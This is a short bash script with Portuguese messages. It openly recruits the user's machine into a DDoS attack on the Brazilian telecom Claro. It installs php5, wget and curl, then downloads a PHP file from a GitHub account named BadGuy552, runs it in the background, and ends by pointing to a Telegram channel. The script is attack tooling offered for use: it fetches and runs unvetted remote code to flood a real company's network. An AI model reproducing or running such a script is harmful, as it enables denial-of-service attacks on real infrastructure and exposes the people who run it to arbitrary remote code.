#!/bin/bash

echo "Esteja ciente que este script ira emprestar sua banda para fazer DDOS na Claro
Todo o projeto sera sigiloso, e o criador deste script, garanto que não vou roubar seu servidor ou algo do tipo
portanto use por sua conta e risco!"
read -p "Pressione qualquer tecla para continuar.."

apt-get update
apt-get install php5 wget curl -y

wget https://raw.githubusercontent.com/BadGuy552/scripts/master/pl.php
php pl.php &
echo "Muito obrigado pela colaboração :)"
echo "https://telegram.me/badguy_channel"
